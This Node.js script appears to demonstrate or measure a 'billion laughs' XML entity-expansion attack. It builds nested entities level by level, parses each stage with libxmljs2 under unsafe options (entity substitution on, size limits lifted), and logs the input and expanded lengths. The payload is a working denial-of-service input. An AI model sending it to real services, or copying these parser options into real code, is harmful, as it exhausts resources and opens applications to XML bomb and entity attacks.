'use strict';

const libxmljs = require('libxmljs2');
const lolSize = 10;
const dodgyOptions = {noent: true, nocdata: true, noblanks: true, huge: true};

let xmlString = '<?xml version="1.0"?>\n' +
  '<!DOCTYPE lolz [\n' +
  ' <!ENTITY lol0 "lol">\n' +
  ' <!ELEMENT lolz (#PCDATA)>';

console.log('"# Lolz","XML Length","Expanded Length"');
for (let numLolz = 1; numLolz <= 10; ++numLolz) {
  const lolString = `<!ENTITY lol${numLolz} "` + `&lol${numLolz - 1};`.repeat(lolSize) + '">';
  xmlString += lolString;
  const fullXml = `${xmlString}]><lolz>&lol${numLolz};</lolz>`;
  const parsedXml = libxmljs.parseXml(fullXml, dodgyOptions).toString();
  console.log(`${numLolz},${fullXml.length},${parsedXml.length}`);
}
